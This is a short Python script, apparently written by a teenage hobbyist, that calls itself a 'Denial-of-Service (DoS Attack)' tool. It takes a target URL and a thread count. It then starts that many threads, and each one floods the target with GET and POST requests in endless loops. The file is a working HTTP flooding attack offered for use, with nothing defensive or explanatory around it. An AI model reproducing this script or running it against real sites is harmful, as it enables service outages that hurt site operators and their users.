#!/usr/bin/python3

from requests import get,post
from threading import Thread
from sys import argv
from random import choice
import cowsay

def Get():
	while True:
		try:	get(argv[1]),print("\033[92m\033[01m[+] Sending GET  Request to",argv[1]+"...\033[00m")
		except:	print("\033[91m\033[01m[-] GET  Packet Dropped!!\033[00m")

def Post():
	while True:
		try:	post(argv[1]),print("\033[92m\033[01m[+] Sending POST Request to",argv[1]+"...\033[00m")
		except:	print("\033[91m\033[01m[-] POST Packet Dropped!!\033[00m")

def Get_Thread():
	get_begin=0
	while get_begin <= argv[2]:
		exec("g"+str(get_begin)+"=Thread(target=Get)")
		get_begin+=1
	get_Begin=0
	while get_Begin <= argv[2]:
		exec("g"+str(get_Begin)+".start()")
		get_Begin+=1

def Post_Thread():
	post_begin=0
	while post_begin <= argv[2]:
		exec("p"+str(post_begin)+"=Thread(target=Post)")
		post_begin+=1
	post_Begin=0
	while post_Begin <= argv[2]:
		exec("p"+str(post_Begin)+".start()")
		post_Begin+=1

def Main():
	t1=Thread(target=Get_Thread)
	t2=Thread(target=Post_Thread)
	t1.start()
	t2.start()

if __name__ == "__main__":
	print("\033[97m\033[01m",end="")
	if len(argv) != 3:     print("Usage: python3",argv[0],"<URL> <Threading_Num>\nExample:","python3",argv[0],"http\\https://example.com 100"),quit()
	try:	argv[2]=int(argv[2])
	except:	print("Usage: python3",argv[0],"<URL> <Threading_Num>\n<Threading_Num>:must be an integer")
	else:
		try:	get(argv[1]),print("\033[93m\033[01m",end=""),exec("cowsay."+choice(list(cowsay.char_names))+'("Denial-of-Service (DoS Attack)                         By: Abd Almoen Arafa (0.1Arafa)                                                 Age: 15")'),print("\033[00m"),Main()
		except:	print("\033[00m\033[91m[-] Error, Bad URL or check your Internet Connection\033[00m"),quit()

#By: Abd Almoen Arafa (0.1Arafa)
#Age: 15
